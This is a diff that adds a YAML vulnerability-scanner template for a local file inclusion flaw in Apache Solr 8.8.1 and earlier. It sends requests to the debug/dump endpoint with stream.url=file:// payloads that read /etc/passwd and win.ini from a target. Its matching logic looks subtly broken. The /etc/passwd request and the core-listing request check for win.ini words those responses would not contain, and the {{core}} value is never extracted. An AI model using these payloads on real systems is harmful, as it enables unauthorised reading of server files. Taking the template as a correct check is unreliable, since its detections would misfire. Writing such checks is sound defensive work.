@@ -1,0 +1,55 @@
+id: apache-solr-file-read
+brief:
+    title: Apache Solr <=8.8.1 - Local File Inclusion
+    by: DhiyaneshDk
+    level: high
+    about: Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.
+    label:
+        - apache
+        - solr
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/solr/admin/cores?wt=json'
+      head:
+        Accept-Language: en
+        Connection: close
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream'
+      head:
+        Accept-Language: en
+        Connection: close
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream'
+      head:
+        Accept-Language: en
+        Connection: close
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
